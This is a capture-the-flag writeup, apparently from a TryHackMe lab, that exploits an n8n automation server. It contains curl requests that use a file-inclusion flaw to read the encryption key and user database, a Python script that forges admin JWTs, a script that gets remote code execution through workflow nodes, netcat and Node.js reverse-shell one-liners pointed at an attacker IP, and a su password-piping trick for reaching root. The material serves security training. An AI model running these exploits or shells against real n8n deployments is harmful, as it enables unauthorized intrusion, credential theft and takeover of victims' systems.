# Cypheron - Nightmare: Full CTF Writeup

**Target:** `10.49.182.107:5678` (n8n instance)
**Objective:** Gain initial access, escalate privileges, and retrieve user and root flags.

---

## 1. Initial Reconnaissance
Initial enumeration revealed an n8n orchestrator running on port `5678`. The mission briefing hinted at a public intake form at `/form/file-processor` that was "a little too trusting about what its visitors claim to carry." This points directly to an unauthenticated Local File Inclusion (LFI) vulnerability (CVE-2026-21858).

---

## 2. Phase 1: Local File Inclusion (LFI)
The `/form/file-processor` endpoint expects a JSON payload defining file uploads. The vulnerability exists because the backend blindly trusts the `filepath` parameter provided in the JSON body.

### 2.1 Extracting the Encryption Key
We can read the application's configuration file to steal the `encryptionKey`, which is used to sign session tokens.

**Command:**
```bash
curl -s -X POST http://10.49.182.107:5678/form/file-processor \
  -H "Content-Type: application/json" \
  -d '{"data": {}, "files": {"file": {"filepath": "/home/node/.n8n/config", "originalFilename": "pwn.txt"}}}'
```
**Result:**
```json
{
	"encryptionKey": "cve-2026-21858-lab-enc-key"
}
```

### 2.2 Extracting the Database
We repeat the process to download the SQLite database, which contains administrative user credentials.

**Command:**
```bash
curl -s -X POST http://10.49.182.107:5678/form/file-processor \
  -H "Content-Type: application/json" \
  -d '{"data": {}, "files": {"file": {"filepath": "/home/node/.n8n/database.sqlite", "originalFilename": "pwn.txt"}}}' \
  --output database.sqlite
```

### 2.3 Querying the Database
Using `sqlite3`, we extract the administrator's UUID, email, and bcrypt password hash.

**Commands:**
```bash
sqlite3 database.sqlite ".tables"
sqlite3 database.sqlite "SELECT id, email, password FROM user;"
```
**Extracted Credentials:**
- **ID:** `f52da01b-db1b-4ad5-97d0-2f2ee6332825`
- **Email:** `admin@lab.local`
- **Hash:** `$2a$10$WzzFAGQjc2oloWOzhxgpCuiAeX226sFhnMiLBQjFLyBw7WLHN.lGq`

---

## 3. Phase 2: Authentication Bypass (JWT Forging)
n8n uses JWTs signed with a secret derived from the `encryptionKey`. By stealing the key and the user metadata, we can forge a valid administrative token.

### 3.1 Token Forging Logic
1.  **JWT Secret:** SHA-256 hash of every second character of the `encryptionKey`.
2.  **Admin Hash:** First 10 characters of the Base64-encoded SHA-256 hash of `email:password_hash`.
3.  **Browser ID:** A unique ID that must match the `browser-id` HTTP header.

**Forge Script (`forge_admin_token.py`):**
```python
import hashlib, jwt, time
from base64 import b64encode

enc_key = "cve-2026-21858-lab-enc-key"
admin_id = "f52da01b-db1b-4ad5-97d0-2f2ee6332825"
admin_email = "admin@lab.local"
password_hash = "$2a$10$WzzFAGQjc2oloWOzhxgpCuiAeX226sFhnMiLBQjFLyBw7WLHN.lGq"
browser_id = "pwn-browser"

# Derive Secret
final_secret = hashlib.sha256(enc_key[::2].encode()).hexdigest()

# Generate admin_hash
combined = f"{admin_email}:{password_hash}".encode()
admin_hash = b64encode(hashlib.sha256(combined).digest()).decode()[:10]

# Generate JWT
payload = {
    "id": admin_id,
    "hash": admin_hash,
    "browserId": b64encode(hashlib.sha256(browser_id.encode()).digest()).decode(),
    "usedMfa": False,
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}
token = jwt.encode(payload, final_secret, algorithm="HS256")
print(token)
```

---

## 4. Phase 3: Remote Code Execution (RCE)
With administrative API access, we abuse the `n8n-nodes-base.executeCommand` node to run shell commands on the host.

### 4.1 RCE Workflow
The automation script performs three steps:
1.  **Create Workflow (`POST /rest/workflows`):** Defines an `executeCommand` node with our payload.
2.  **Trigger Execution (`POST /rest/workflows/{id}/run`):** Starts the workflow.
3.  **Fetch Output (`GET /rest/executions/{id}`):** Retrieves the command's stdout from the n8n history.

**RCE Automation Script (`rce_exploit.py`):**
```python
import requests, json, time, sys

TARGET_URL = "http://10.49.182.107:5678"
AUTH_TOKEN = "<FORGED_JWT>"
HEADERS = {"content-type": "application/json", "browser-id": "pwn-browser"}
COOKIES = {"n8n-auth": AUTH_TOKEN}

def execute(cmd):
    # 1. Create
    payload = {"name": "Exploit", "nodes": [{"parameters": {"command": cmd}, "name": "CMD", "type": "n8n-nodes-base.executeCommand", "typeVersion": 1}]}
    wf_id = requests.post(f"{TARGET_URL}/rest/workflows", headers=HEADERS, cookies=COOKIES, json=payload).json()["data"]["id"]
    # 2. Run
    exec_id = requests.post(f"{TARGET_URL}/rest/workflows/{wf_id}/run", headers=HEADERS, cookies=COOKIES, json={"workflowData": {"id": wf_id}}).json()["data"]["executionId"]
    # 3. Output
    time.sleep(1)
    res = requests.get(f"{TARGET_URL}/rest/executions/{exec_id}", headers=HEADERS, cookies=COOKIES).json()["data"]["data"]
    print(res)

execute(sys.argv[1])
```

---

## 5. Post-Exploitation
### 5.1 Retrieving the User Flag
We search the home directory of the `node` user.
```bash
python3 rce_exploit.py "ls -la /home/node"
python3 rce_exploit.py "cat /home/node/flag-user-lfi.txt"
```
**User Flag:** `THM{nightmare_just_begun}`

### 5.2 Gaining a Reverse Shell
For a more interactive experience, we can spawn a reverse shell.

**Netcat FIFO Payload:**
```bash
python3 rce_exploit.py "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f"
```

**Node.js Payload:**
```bash
python3 rce_exploit.py "node -e 'const net=require(\"net\"),cp=require(\"child_process\");const s=net.connect(4444,\"<KALI_IP>\",()=>{const c=cp.spawn(\"/bin/sh\",[]);s.pipe(c.stdin);c.stdout.pipe(s);c.stderr.pipe(s);});'"
```

---

## 6. Privilege Escalation to Root
### 6.1 Finding Credentials
We found the root password in a misconfigured setup script.
```bash
python3 rce_exploit.py "cat /setup.sh"
# Result: root:N1ghtm4r3R00t!CTF2026
```

### 6.2 TTY Bypass for `su`
The `su` command requires a TTY. We bypass this using a Node.js script that programmatically pipes the password to `stdin`.

**Command:**
```bash
node -e "
const cp = require('child_process');
const su = cp.spawn('su', ['-', '-c', 'id']); 
su.stdout.on('data', (data) => console.log(data.toString()));
su.stdin.write('N1ghtm4r3R00t!CTF2026\n');
"
```

### 6.3 Container Escape (Root Flag)
The host's root filesystem is mounted at `/host-root`. We use our `su` wrapper to read the final flag from the host machine.

**Command:**
```bash
python3 rce_exploit.py "node -e \"const cp = require('child_process'); const su = cp.spawn('su', ['-', '-c', 'cat /host-root/flag.txt']); su.stdout.on('data', (data) => console.log(data.toString())); su.stdin.write('N1ghtm4r3R00t!CTF2026\\n');\""
```
**Root Flag:** `THM{p4g3_c4ch3_g0t_wr1tt3n_k3rn3l_pwn3d_c0nt41n3r_3sc4p3d}`

---
*Writeup complete. All objectives achieved.*